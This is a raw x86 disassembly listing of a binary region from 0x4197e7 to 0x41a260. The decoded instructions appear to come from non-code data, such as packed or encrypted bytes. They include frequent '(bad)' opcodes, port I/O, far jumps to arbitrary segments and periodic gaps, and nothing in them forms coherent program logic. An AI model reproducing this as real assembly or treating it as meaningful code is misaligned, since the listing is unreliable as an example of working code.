  4197e7:	sti    
  4197e8:	mov    esp,0x66448e03
  4197ed:	pop    ebx
  4197ee:	inc    ecx
  4197ef:	cdq    
  4197f0:	imul   eax,edx,0xe8e4766c
  4197f6:	pop    edi
  4197f7:	or     ebp,DWORD PTR [ebx]
  4197f9:	ret    0xbd00
  4197fc:	ins    DWORD PTR es:[edi],dx
  4197fd:	aaa    
  4197fe:	jbe    0x41982a
  419800:	or     eax,0x43ed4d01
  419805:	adc    BYTE PTR [esi],cl
  419807:	inc    edi
  419808:	xor    eax,0x3c3c8849
  41980d:	loope  0x41982d
  41980f:	fld1   
  419811:	popf   
  419812:	mov    ds:0x90872246,eax
  419817:	jbe    0x41982a
  419819:	mov    ch,0x89
  41981b:	scas   al,BYTE PTR es:[edi]
  41981c:	add    eax,0xdd2ba4cf
  419821:	mov    bh,0xcd
  419823:	cmp    DWORD PTR [eax],ebp
  419825:	test   BYTE PTR [eax],dl
  419827:	sub    al,0x6c
  419829:	dec    ecx
  41982a:	adc    esi,DWORD PTR [edi-0x4a]
  41982d:	dec    ebx
  41982e:	adc    al,0x91
  419830:	or     eax,0x97edd1f7
  419835:	push   0x76
  419837:	out    dx,eax
  419838:	rcl    DWORD PTR [esi+0x387a0768],cl
  41983e:	dec    esi
  41983f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419840:	je     0x4198a7
  419842:	mov    eax,ds:0x7416c625
  419847:	mov    dl,0x81
  419849:	jecxz  0x4197d8
  41984b:	jno    0x4197f1
  41984d:	int3   
  41984e:	mov    ch,0xa8
  419850:	jmp    0x4198cf
  419852:	mov    dl,0xe1
  419854:	(bad)  
  419855:	mov    edx,0x4c5d1257
  41985a:	imul   ebp,ebp,0xffffffd4
  41985d:	sub    DWORD PTR [edx-0xe74f355],edi
  419863:	mov    ecx,0x5bf2ad36
  419868:	sbb    al,0x20
  41986a:	jbe    0x419807
  41986c:	mov    esi,0x40862e18
  419871:	inc    ebx
  419872:	dec    ebx
  419873:	imul   edx,ecx,0x16
  419876:	loop   0x41988f
  419878:	fldcw  WORD PTR [ebp+0x33]
  41987b:	pop    edx
  41987c:	mov    esp,0x2bb8a358
  419881:	sar    DWORD PTR [ecx-0x5b],0x2a
  419885:	dec    ecx
  419886:	push   edi
  419887:	in     eax,0x7e
  419889:	mov    edi,0xf658f9e6
  41988e:	xor    DWORD PTR [ecx],edi
  419890:	fild   DWORD PTR [eax]
	...
  4198f2:	add    BYTE PTR [eax],al
  4198f4:	sbb    BYTE PTR [ecx],0x47
  4198f7:	loope  0x4198d8
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	(bad)  
  419901:	call   0x1:0xf08d8f1
  419908:	add    eax,0x64000001
  41990d:	lea    edx,[edx+0x2305e006]
  419913:	jg     0x41996d
  419915:	or     edx,DWORD PTR [edx]
  419917:	mov    bl,0xde
  419919:	mov    al,ds:0xeea6f369
  41991e:	retf   0x3e41
  419921:	pop    ss
  419922:	cmp    cl,BYTE PTR [ecx]
  419924:	jo     0x4198ad
  419926:	and    ecx,DWORD PTR [ebp-0x623dbf90]
  41992c:	inc    ebp
  41992d:	and    bh,0xb6
  419930:	sub    eax,edi
  419932:	xchg   BYTE PTR ds:0x3c09c50,dh
  419938:	sbb    edx,DWORD PTR [ecx-0x791a27ce]
  41993e:	fnsave [edx+0x3f998c20]
  419944:	xor    DWORD PTR [ebx+0x6e739598],eax
  41994a:	mov    ds:0x3fad6d2c,al
  41994f:	mov    edx,0x146abb11
  419954:	and    BYTE PTR [ecx+0x1ad5ba50],0x2c
  41995b:	mov    al,ds:0xd5e7296e
  419960:	test   DWORD PTR [edx],esi
  419962:	pop    esi
  419963:	adc    DWORD PTR es:[ecx-0x18],esi
  419967:	fst    DWORD PTR [eax]
  419969:	test   eax,0xa8971a19
  41996e:	push   edi
  41996f:	mov    esi,0xc6ed2d0f
  419974:	cmp    al,0x1c
  419976:	add    ch,BYTE PTR [eax-0xbd3fd67]
  41997c:	dec    esp
  41997d:	or     eax,0x4d868a4c
  419982:	jmp    0x82862b9d
  419987:	in     al,0x4c
  419989:	daa    
  41998a:	xor    al,0xee
  41998c:	test   eax,0x2357dea1
  419991:	inc    edx
  419992:	sbb    al,0x4
  419994:	(bad)  
  419995:	in     al,dx
  419996:	sub    BYTE PTR [eax+0x6ff248ea],cl
  41999c:	xchg   DWORD PTR [eax],esp
  41999e:	or     esp,DWORD PTR [edx-0x66656300]
  4199a4:	arpl   di,di
  4199a6:	adc    eax,0xddb273df
  4199ab:	in     eax,0xed
  4199ad:	xchg   ebp,eax
  4199ae:	stos   DWORD PTR es:[edi],eax
  4199af:	aas    
  4199b0:	mov    DWORD PTR [esi+0x1b326886],ecx
  4199b6:	add    DWORD PTR [esi+0x6836fb28],esp
  4199bc:	dec    ebp
  4199bd:	xchg   ebx,eax
  4199be:	xor    ecx,ebx
  4199c0:	adc    cl,BYTE PTR [eax-0x21]
  4199c3:	idiv   DWORD PTR [ebp-0x28]
  4199c6:	xchg   ebp,eax
  4199c7:	mov    al,0x6d
  4199c9:	mov    cs,WORD PTR [edx+edi*2+0x5e1298bf]
  4199d0:	ins    DWORD PTR es:[edi],dx
  4199d1:	mov    esi,0xdf5caca8
  4199d6:	sar    DWORD PTR [esi-0x35],cl
  4199d9:	daa    
  4199da:	hlt    
  4199db:	rol    DWORD PTR [esi],cl
  4199dd:	outs   dx,BYTE PTR ds:[esi]
  4199de:	and    eax,0xa6f42a65
  4199e3:	repz inc eax
  4199e5:	mov    ecx,?
  4199e7:	ror    DWORD PTR [ecx],1
  4199e9:	inc    esp
  4199ea:	mov    esi,0xb1500481
  4199ef:	xchg   DWORD PTR [edx],ebp
  4199f1:	lods   al,BYTE PTR ds:[esi]
  4199f2:	mov    dl,0xb
  4199f4:	jnp    0x419a0f
  4199f6:	xor    bl,bl
  4199f8:	jmp    0xc79e0030
  4199fd:	mov    bl,0x23
  4199ff:	inc    edi
  419a00:	shr    ah,0x18
  419a03:	push   ebx
  419a04:	add    eax,0x6f8d44c9
  419a09:	repz jg 0x4199ee
  419a0c:	mov    edx,0x643f08e3
	...
  419a71:	add    BYTE PTR [eax],al
  419a73:	add    BYTE PTR [ebx],dh
  419a75:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a7b:	test   ebx,0x72c215d3
  419a81:	cld    
  419a82:	rcl    DWORD PTR [edx+0x1100d],cl
  419a88:	add    eax,0x5000001
  419a8d:	fidivr WORD PTR [edx+0x10]
  419a90:	lock xor DWORD PTR [edi],edi
  419a93:	das    
  419a94:	(bad)  
  419a95:	fucomi st,st(6)
  419a97:	sbb    ah,BYTE PTR [eax+0x20593b74]
  419a9d:	sbb    dl,BYTE PTR [esi+0x7]
  419aa0:	sbb    al,0xf1
  419aa2:	add    DWORD PTR [edi],ebx
  419aa4:	push   esp
  419aa5:	xor    eax,0xa16f6d83
  419aaa:	jno    0x419a81
  419aac:	das    
  419aad:	xor    BYTE PTR [ecx],ah
  419aaf:	pop    ebx
  419ab0:	cmp    DWORD PTR [eax-0x4a183bc7],edx
  419ab6:	test   DWORD PTR ss:[ebx+esi*4-0x3b988628],ebx
  419abe:	in     al,dx
  419abf:	xor    al,0x13
  419ac1:	push   ecx
  419ac2:	sbb    eax,ebx
  419ac4:	fld    TBYTE PTR [eax]
  419ac6:	fstp   TBYTE PTR [esp+edi*2+0x772afe76]
  419acd:	scas   eax,DWORD PTR es:[edi]
  419ace:	inc    ebx
  419acf:	fstp   QWORD PTR [ebx+0x512942f4]
  419ad5:	adc    DWORD PTR [ebp-0x2506a2f3],ebp
  419adb:	outs   dx,DWORD PTR ds:[esi]
  419adc:	dec    edx
  419add:	sub    esp,edi
  419adf:	addr16 add eax,0xca51bdd8
  419ae5:	pop    edx
  419ae6:	outs   dx,DWORD PTR ds:[esi]
  419ae7:	xlat   BYTE PTR ds:[ebx]
  419ae8:	pop    edx
  419ae9:	sbb    dl,BYTE PTR [edi+edx*4]
  419aec:	dec    ebp
  419aed:	addr16 pop es
  419aef:	inc    ecx
  419af0:	dec    ecx
  419af1:	jp     0x419aff
  419af3:	lods   al,BYTE PTR ds:[esi]
  419af4:	dec    edx
  419af5:	mov    ebx,0x687df828
  419afa:	jp     0x419b6b
  419afc:	cmp    cl,bh
  419afe:	and    BYTE PTR [ecx-0x13],bl
  419b01:	retf   0xa7d3
  419b04:	pop    ebp
  419b05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b06:	jo     0x419aaf
  419b08:	push   eax
  419b09:	mov    dh,al
  419b0b:	mov    bl,0x61
  419b0d:	in     al,0xb4
  419b0f:	cs add bl,ah
  419b12:	fdivr  DWORD PTR [ebx-0x4c]
  419b15:	fnstcw WORD PTR [ebp+0x27]
  419b18:	mov    edi,0xd6c5f81e
  419b1d:	add    edi,edx
  419b1f:	mov    eax,ds:0xc30590c7
  419b24:	lods   eax,DWORD PTR ds:[esi]
  419b25:	xor    eax,0x875a7bc6
  419b2a:	retf   
  419b2b:	ret    0xca5b
  419b2e:	push   es
  419b2f:	int3   
  419b30:	sbb    BYTE PTR [ecx-0x58],al
  419b33:	push   edx
  419b34:	mov    eax,ds:0xf6f82bae
  419b39:	(bad)
  419b3c:	xchg   ecx,eax
  419b3d:	ja     0x419b3c
  419b3f:	or     ebx,edx
  419b41:	in     al,0x9e
  419b43:	fimul  WORD PTR ds:0xe2a2ab34
  419b49:	lods   eax,DWORD PTR ds:[esi]
  419b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b4b:	jb     0x419b3a
  419b4d:	push   0xffffff95
  419b4f:	and    bl,BYTE PTR [ecx]
  419b51:	jae    0x419b72
  419b53:	pop    eax
  419b54:	add    DWORD PTR [edi+0x1c],eax
  419b57:	cld    
  419b58:	jecxz  0x419bb9
  419b5a:	fld    DWORD PTR [ebx]
  419b5c:	dec    edx
  419b5d:	les    eax,FWORD PTR [ebx+0x5a]
  419b60:	clc    
  419b61:	cmp    dh,BYTE PTR [ebx]
  419b63:	xor    edx,esi
  419b65:	mov    ebp,0x59ba86dc
  419b6a:	push   0xf6755df5
  419b6f:	lods   al,BYTE PTR ds:[esi]
  419b70:	adc    al,BYTE PTR ds:0xba64bb25
  419b76:	push   ebp
  419b77:	jle    0x419b22
  419b79:	dec    eax
  419b7a:	pop    esi
  419b7b:	aas    
  419b7c:	lahf   
  419b7d:	push   edi
  419b7e:	cmp    BYTE PTR [edi+eiz*2],dl
  419b81:	jp     0x419b27
  419b83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b84:	add    BYTE PTR [ecx],al
  419b86:	push   0xffffffa2
  419b88:	or     al,0xef
  419b8a:	dec    ebp
  419b8b:	mov    dl,0x34
  419b8d:	xchg   ebx,eax
  419b8e:	sbb    al,0x8b
  419b90:	clc    
	...
  419bf1:	add    BYTE PTR [eax],al
  419bf3:	add    BYTE PTR [edx-0x3c],cl
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x14
  419c01:	cld    
  419c02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c04:	adc    dl,BYTE PTR [ecx]
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    eax,0x2b000001
  419c0d:	dec    ebx
  419c0e:	add    dl,bh
  419c10:	out    dx,eax
  419c11:	sub    al,0x63
  419c13:	fs jb  0x419c2b
  419c16:	ja     0x419c2c
  419c18:	rol    BYTE PTR [edi-0x5e9ba6a4],cl
  419c1e:	dec    ecx
  419c1f:	stos   DWORD PTR es:[edi],eax
  419c20:	add    esi,DWORD PTR [eax]
  419c22:	jno    0x419c66
  419c24:	rcl    BYTE PTR [ecx],1
  419c26:	add    eax,0x128765c3
  419c2b:	pop    ecx
  419c2c:	mov    edx,0xea93ac02
  419c31:	es fmul st(1),st
  419c34:	or     ah,dl
  419c36:	loopne 0x419c8c
  419c38:	push   0xffffffdf
  419c3a:	mov    dl,bl
  419c3c:	push   es
  419c3d:	outs   dx,BYTE PTR ds:[esi]
  419c3e:	into   
  419c3f:	adc    eax,0x67890c93
  419c44:	xor    al,BYTE PTR [eax+ebp*1]
  419c47:	xchg   ah,al
  419c49:	bound  ecx,QWORD PTR [ecx+esi*8-0x1b]
  419c4d:	loope  0x419cbe
  419c4f:	leave  
  419c50:	and    ah,BYTE PTR [esi+edi*8-0x2a]
  419c54:	pop    ecx
  419c55:	push   0x13
  419c57:	aam    0x31
  419c59:	cmp    eax,0x7dac03b4
  419c5e:	je     0x419c4b
  419c60:	aam    0x1e
  419c62:	inc    edx
  419c63:	mov    cl,0xaa
  419c65:	inc    edi
  419c66:	in     al,0x10
  419c68:	mov    esp,0xbb808cd5
  419c6d:	add    al,0x92
  419c6f:	adc    BYTE PTR [edi-0xe],0xcd
  419c73:	or     al,0x7d
  419c75:	or     al,0x2
  419c77:	(bad)
  419c7a:	aam    0x1a
  419c7c:	xchg   dh,al
  419c7e:	daa    
  419c7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c80:	das    
  419c81:	and    dl,BYTE PTR [edi+ebp*2-0x2d]
  419c85:	add    BYTE PTR [ecx+0x4554b6c0],ch
  419c8b:	inc    ecx
  419c8c:	push   0x94461357
  419c91:	jmp    0x9bb0d1b8
  419c96:	int    0xca
  419c98:	mov    al,0x20
  419c9a:	pushf  
  419c9b:	add    cl,BYTE PTR [ebp+edx*8+0x24aa47c6]
  419ca2:	mov    DWORD PTR [esi+ecx*2],0x29316b36
  419ca9:	rcl    DWORD PTR [eax],0xbd
  419cac:	push   esp
  419cad:	mov    eax,0x82310a07
  419cb2:	ret    0xf303
  419cb5:	mov    ch,0x9c
  419cb7:	add    eax,0xfd22b9fd
  419cbc:	je     0x419cf4
  419cbe:	adc    ah,bh
  419cc0:	push   edx
  419cc1:	aad    0x8d
  419cc3:	ins    BYTE PTR es:[edi],dx
  419cc4:	mov    ch,BYTE PTR [ecx+0x15e686f7]
  419cca:	jge    0x419c7a
  419ccc:	in     al,dx
  419ccd:	inc    DWORD PTR [ecx+edx*2]
  419cd0:	in     eax,dx
  419cd1:	add    edi,edx
  419cd3:	xor    bh,0xec
  419cd6:	adc    bh,0xe4
  419cd9:	sbb    ch,BYTE PTR [edx-0x853bb16]
  419cdf:	pop    ds
  419ce0:	jnp    0x419d16
  419ce2:	ficom  WORD PTR [eax+0x7600173d]
  419ce8:	dec    esp
  419ce9:	pop    ecx
  419cea:	pop    ebp
  419ceb:	mov    ebx,0x43687355
  419cf0:	pop    ebp
  419cf1:	push   0x28d05a4b
  419cf6:	xchg   ebx,eax
  419cf7:	adc    eax,0x2445f105
  419cfc:	test   al,0x89
  419cfe:	xchg   ecx,eax
  419cff:	fidivr WORD PTR [edi-0x80]
  419d02:	add    BYTE PTR [ebp-0x4484379a],ah
  419d08:	jge    0x419cf2
  419d0a:	and    DWORD PTR [ecx+esi*4+0x5c0790c4],edi
	...
  419d71:	add    BYTE PTR [eax],al
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fiadd  DWORD PTR ss:[edi+0x37]
  419d82:	pop    esp
  419d83:	daa    
  419d84:	pop    ss
  419d85:	adc    al,BYTE PTR [ecx]
  419d87:	add    BYTE PTR ds:0xd3000001,al
  419d8d:	lds    ebp,FWORD PTR [ebx-0x7896846f]
  419d93:	xor    BYTE PTR [esi+esi*1-0x38],bl
  419d97:	les    edx,FWORD PTR [ebp+0x4f]
  419d9a:	mov    ds:0x6ee1b103,al
  419d9f:	(bad)  [esi]
  419da1:	sub    BYTE PTR [ebp+0x224d24af],0xae
  419da8:	shl    al,cl
  419daa:	sbb    eax,0x6f2e5368
  419daf:	adc    cl,BYTE PTR [ebx]
  419db1:	or     al,0x88
  419db3:	pop    edx
  419db4:	in     al,0xcc
  419db6:	imul   esp,DWORD PTR [esi-0x36a9e1c4],0xffffff9c
  419dbd:	(bad)  
  419dbf:	ret    0xc05c
  419dc2:	ins    DWORD PTR es:[edi],dx
  419dc3:	push   ecx
  419dc4:	fbstp  TBYTE PTR [edi-0x7ac7e421]
  419dca:	jge    0x419df5
  419dcc:	int3   
  419dcd:	rcl    BYTE PTR [eax],0x4a
  419dd0:	not    bh
  419dd2:	xchg   esp,eax
  419dd3:	popf   
  419dd4:	pusha  
  419dd5:	aaa    
  419dd6:	aad    0x99
  419dd8:	adc    ebp,DWORD PTR [edi-0x2]
  419ddb:	mov    ebp,0x63b39dfc
  419de0:	and    esi,DWORD PTR [esi+0x6c]
  419de3:	inc    edx
  419de4:	sbb    ch,bh
  419de6:	out    dx,al
  419de7:	xor    al,0xdf
  419de9:	test   al,0x64
  419deb:	jp     0x419e3e
  419ded:	and    eax,0x6fb9ba71
  419df2:	cmp    BYTE PTR [esi+0x71af05bb],dh
  419df8:	(bad)  
  419df9:	pop    eax
  419dfa:	push   0x51f009c6
  419dff:	cmp    dh,BYTE PTR [edx+ebp*2-0x45998ee9]
  419e06:	in     al,0x37
  419e08:	(bad)  
  419e09:	sub    eax,0x6cfda62b
  419e0e:	out    dx,al
  419e0f:	mov    ah,0xaf
  419e11:	add    eax,0xea468a8d
  419e16:	xchg   edi,eax
  419e17:	jge    0x419dfe
  419e19:	aaa    
  419e1a:	ds sbb al,0x1b
  419e1d:	add    eax,0x1179393a
  419e22:	les    esi,FWORD PTR [ebp+0x208cfb1e]
  419e28:	xchg   edi,eax
  419e29:	iret   
  419e2a:	pop    esp
  419e2b:	or     BYTE PTR [esi+0x76],bh
  419e2e:	ds mov bl,0x3a
  419e31:	add    cl,BYTE PTR [edx+0x40131ebb]
  419e37:	loope  0x419ea5
  419e39:	add    DWORD PTR [ebp+0x6789d034],esp
  419e3f:	xchg   esi,eax
  419e40:	ss out 0x2a,al
  419e43:	jo     0x419e6d
  419e45:	pop    ecx
  419e46:	push   eax
  419e47:	jmp    0xfb9891ab
  419e4c:	xor    al,0xa
  419e4e:	push   ebp
  419e4f:	or     dh,cl
  419e51:	inc    eax
  419e52:	lahf   
  419e53:	sub    eax,DWORD PTR [ebx+0x19]
  419e56:	dec    eax
  419e57:	pushf  
  419e58:	adc    esp,DWORD PTR [ebp-0x3b389116]
  419e5e:	push   ebp
  419e5f:	loop   0x419e9d
  419e61:	es ds shl ch,0x8b
  419e66:	xor    BYTE PTR [eax],0xda
  419e69:	mov    ah,0x78
  419e6b:	adc    ebx,DWORD PTR [esi]
  419e6d:	test   DWORD PTR [ebp-0x25],ecx
  419e70:	out    dx,al
  419e71:	xor    bh,BYTE PTR [esp+edi*2+0x1733f8aa]
  419e78:	stos   DWORD PTR es:[edi],eax
  419e79:	xchg   esi,eax
  419e7a:	sub    esi,DWORD PTR [ebx-0x71e96ece]
  419e80:	push   edi
  419e81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e83:	pop    ss
  419e84:	ror    BYTE PTR [eax-0x49a2b330],cl
  419e8a:	in     eax,0xb
  419e8c:	mov    esi,0x3fea69a7
	...
  419ef1:	add    BYTE PTR [eax],al
  419ef3:	add    BYTE PTR [edi+0x5fc517d8],al
  419ef9:	iret   
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	jmp    0x419eb8
  419f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f03:	xchg   edx,eax
  419f04:	sbb    al,0x13
  419f06:	add    DWORD PTR [eax],eax
  419f08:	add    eax,0x47000001
  419f0d:	pop    ecx
  419f0e:	xchg   ecx,esp
  419f10:	retf   
  419f11:	daa    
  419f12:	dec    ebx
  419f13:	mov    ebp,DWORD PTR [eax]
  419f15:	push   ebp
  419f16:	addr16 push ecx
  419f18:	shr    esi,0xb4
  419f1b:	loopne 0x419f28
  419f1d:	jb     0x419ec7
  419f1f:	cli    
  419f20:	loope  0x419f7a
  419f22:	pop    edi
  419f23:	clc    
  419f24:	in     eax,0xc9
  419f26:	out    0x4f,al
  419f28:	mov    cl,0xc
  419f2a:	sub    eax,0x4abfb263
  419f2f:	jmp    0x5bf3:0x2bc2c5c9
  419f36:	daa    
  419f37:	out    dx,al
  419f38:	or     BYTE PTR [ecx-0x428449d2],bl
  419f3e:	xor    DWORD PTR [ecx-0xc],edx
  419f41:	clc    
  419f42:	neg    BYTE PTR [ecx]
  419f44:	(bad)  
  419f45:	pminsw mm3,QWORD PTR [edi+0x23ba7086]
  419f4c:	icebp  
  419f4d:	xor    al,0x88
  419f4f:	jg     0x419f77
  419f51:	sbb    BYTE PTR [esi-0x62],al
  419f54:	add    DWORD PTR [esi-0x67],0x720ae0f8
  419f5b:	int3   
  419f5c:	and    al,0xb1
  419f5e:	out    dx,eax
  419f5f:	jp     0x419f55
  419f61:	xchg   ebx,eax
  419f62:	stos   DWORD PTR es:[edi],eax
  419f63:	add    bl,ch
  419f65:	jecxz  0x419fcd
  419f67:	into   
  419f68:	ret    
  419f69:	std    
  419f6a:	mov    edx,0x1895aa57
  419f6f:	outs   dx,BYTE PTR ds:[esi]
  419f70:	cmp    eax,0x4320f176
  419f75:	inc    esp
  419f76:	enter  0x24ef,0xbe
  419f7a:	call   0xb78d:0x278c4258
  419f81:	jns    0x419f51
  419f83:	pop    ss
  419f84:	and    al,0x4e
  419f86:	stos   DWORD PTR es:[edi],eax
  419f87:	mov    edx,0xde29b3f5
  419f8c:	js     0x419f9e
  419f8e:	push   esp
  419f8f:	call   DWORD PTR [edi-0x713c58d9]
  419f95:	push   cs
  419f96:	test   BYTE PTR [ebp+edx*1+0x45],0x28
  419f9b:	(bad)  
  419f9c:	std    
  419f9d:	arpl   WORD PTR ds:0x1914f0a7,cx
  419fa3:	xchg   BYTE PTR [eax+0xf43fbb7],bh
  419fa9:	lock mov dh,0x80
  419fac:	xor    ah,BYTE PTR [esi]
  419fae:	and    dl,dl
  419fb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fb1:	mov    ebp,0x4afd50fa
  419fb6:	pop    es
  419fb7:	jg     0x419ff1
  419fb9:	loope  0x419fee
  419fbb:	xor    eax,0x94e737ae
  419fc0:	lods   al,BYTE PTR ds:[esi]
  419fc1:	jae    0x419f8e
  419fc3:	sub    DWORD PTR [eax+0x376b0bde],esp
  419fc9:	mov    ebp,0x468ad5a1
  419fce:	in     al,dx
  419fcf:	mov    edi,0x101db22c
  419fd4:	icebp  
  419fd5:	cmp    al,0xf
  419fd7:	ss pop ebp
  419fd9:	xchg   esi,eax
  419fda:	lods   al,BYTE PTR ds:[esi]
  419fdb:	inc    esp
  419fdc:	out    dx,al
  419fdd:	cmp    eax,0x348bb60a
  419fe2:	ret    0x6d2d
  419fe5:	vpmulhrsw zmm0{k4}{z},zmm2,ZMMWORD PTR [ebp-0x16c0]
  419fec:	inc    ebp
  419fed:	xor    eax,0x49a620e2
  419ff2:	mov    al,ds:0x1ceec16b
  419ff7:	pop    ecx
  419ff8:	lock xor bl,cl
  419ffb:	clc    
  419ffc:	mov    edi,0x21dcd698
  41a001:	enter  0x4f05,0xd1
  41a005:	adc    edi,eax
  41a007:	jbe    0x41a052
  41a009:	mov    eax,0x81e67ace
  41a00e:	xchg   DWORD PTR [eax+edx*4+0x0],esp
	...
  41a071:	add    BYTE PTR [eax],al
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax+0x9],bh
  41a081:	xchg   BYTE PTR [esi-0x2e],dl
  41a084:	and    DWORD PTR [ecx+eax*1],edx
  41a087:	add    BYTE PTR ds:0xd7000001,al
  41a08d:	cmp    edx,DWORD PTR [esi+ebx*1]
  41a090:	sbb    BYTE PTR ds:0x3aa0820e,ah
  41a096:	mov    ah,0xc8
  41a098:	pop    ds
  41a099:	cmp    esi,DWORD PTR [edx-0x7e]
  41a09c:	repnz (bad) 
  41a09e:	sub    eax,0xf730a2ec
  41a0a3:	or     esp,ebx
  41a0a5:	ror    ecx,1
  41a0a7:	or     DWORD PTR [edi-0x57],edi
  41a0aa:	dec    ecx
  41a0ab:	fs repz push edx
  41a0ae:	repnz cmc 
  41a0b0:	push   ecx
  41a0b1:	fcom   QWORD PTR [ebx-0x7d]
  41a0b4:	and    ah,BYTE PTR [ecx-0x1b257ac6]
  41a0ba:	xchg   edi,eax
  41a0bb:	mov    dh,0x12
  41a0bd:	cmc    
  41a0be:	fstp   QWORD PTR [ebx]
  41a0c0:	and    DWORD PTR ds:0x11acc25d,ecx
  41a0c6:	shl    DWORD PTR [ecx+0x62],cl
  41a0c9:	icebp  
  41a0ca:	mov    ebp,0x8cde567b
  41a0cf:	xchg   esi,eax
  41a0d0:	sbb    DWORD PTR [ecx-0x4b],0xa88ad4aa
  41a0d7:	bound  edx,QWORD PTR ds:0x4ce6d45c
  41a0dd:	push   edx
  41a0de:	jp     0x41a0b7
  41a0e0:	dec    ecx
  41a0e1:	jno    0x41a0c5
  41a0e3:	xchg   BYTE PTR [edx],bl
  41a0e5:	and    bl,BYTE PTR [eax-0x78b59e8d]
  41a0eb:	xor    cl,BYTE PTR [ebp+0x4fb14642]
  41a0f1:	pop    ebp
  41a0f2:	inc    ecx
  41a0f3:	fist   WORD PTR [eax+ebp*8]
  41a0f6:	pop    esp
  41a0f7:	push   cs
  41a0f8:	dec    edi
  41a0f9:	fcmovu st,st(6)
  41a0fb:	sbb    ah,BYTE PTR [edi+0x610a966]
  41a101:	xchg   esp,eax
  41a102:	push   edx
  41a103:	jl     0x41a144
  41a105:	xchg   ebp,ecx
  41a107:	fwait
  41a108:	(bad)  
  41a109:	loopne 0x41a150
  41a10b:	call   0x6a6f:0xb43117fc
  41a112:	jecxz  0x41a189
  41a114:	push   es
  41a115:	push   ecx
  41a116:	fadd   DWORD PTR [edx+0x61]
  41a119:	jmp    0x93dcd13d
  41a11e:	test   eax,0x6c565c2b
  41a123:	repnz or BYTE PTR [ebx+ecx*1+0x14],al
  41a128:	in     al,0xc
  41a12a:	adc    al,0xf7
  41a12c:	inc    esp
  41a12d:	sahf   
  41a12e:	dec    edi
  41a12f:	jecxz  0x41a109
  41a131:	rol    DWORD PTR [ebp-0x51951047],1
  41a137:	mov    bl,0xf
  41a139:	call   0xd5fc:0x2c3ccbec
  41a140:	sbb    eax,0x86e09fe
  41a145:	test   DWORD PTR [ecx],ecx
  41a147:	or     BYTE PTR [ebx],bl
  41a149:	mov    ebx,0xd94de56c
  41a14e:	jmp    0xbc58:0xcd4f3cfe
  41a155:	(bad)  
  41a156:	mov    dh,0xbb
  41a158:	jne    0x41a0dd
  41a15a:	xchg   edx,eax
  41a15b:	arpl   WORD PTR [eax+ebx*8+0x78],dx
  41a15f:	loopne 0x41a0e2
  41a161:	loopne 0x41a138
  41a163:	cmp    al,0x92
  41a165:	cld    
  41a166:	jb     0x41a167
  41a168:	sub    bl,dh
  41a16a:	in     al,dx
  41a16b:	cmp    BYTE PTR [ebx-0xa72a780],bh
  41a171:	xor    cl,al
  41a173:	or     eax,0x3df0e87e
  41a178:	cdq    
  41a179:	int3   
  41a17a:	sbb    ecx,DWORD PTR [ecx+ecx*8]
  41a17d:	or     esp,DWORD PTR [ecx-0x1bd34bfb]
  41a183:	inc    ebx
  41a184:	daa    
  41a185:	rol    DWORD PTR [edx-0x38],1
  41a188:	push   es
  41a189:	lods   al,BYTE PTR ds:[esi]
  41a18a:	iret   
  41a18b:	test   DWORD PTR [esi],0xaaa92601
	...
  41a1f1:	add    BYTE PTR [eax],al
  41a1f3:	add    BYTE PTR [esp+ecx*1],bl
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	popf   
  41a201:	es pusha 
  41a203:	adc    esp,DWORD PTR [esi]
  41a205:	adc    eax,0x1050001
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	sbb    eax,0x36df65cf
  41a211:	dec    ebp
  41a212:	pop    edx
  41a213:	adc    al,cl
  41a215:	shl    BYTE PTR [edi-0x11198e8c],cl
  41a21b:	loope  0x41a29a
  41a21d:	ja     0x41a29d
  41a21f:	mov    dl,0x9d
  41a221:	outs   dx,DWORD PTR ds:[esi]
  41a222:	mov    al,ds:0x73be57f6
  41a227:	inc    ebx
  41a228:	stos   DWORD PTR es:[edi],eax
  41a229:	icebp  
  41a22a:	in     al,0x3c
  41a22c:	sar    BYTE PTR [esi+0x5eac739a],1
  41a232:	or     BYTE PTR [esi+0x5a],dl
  41a235:	push   ecx
  41a236:	es in  eax,0x7c
  41a239:	fdivp  st(7),st
  41a23b:	imul   eax,DWORD PTR [eax],0x5a56b145
  41a241:	clc    
  41a242:	fld    DWORD PTR [edx-0x50ac493a]
  41a248:	ffreep st(7)
  41a24a:	adc    edi,DWORD PTR [edx+eiz*2+0x1]
  41a24e:	out    0x8b,eax
  41a250:	test   ebx,edx
  41a252:	cmp    BYTE PTR [ebx+0x1f2306b1],ch
  41a258:	push   edx
  41a259:	mov    dl,0x7a
  41a25b:	and    BYTE PTR [edi],dl
  41a25d:	je     0x41a1e8
  41a25f:	cwde   
  41a260:	inc    eax
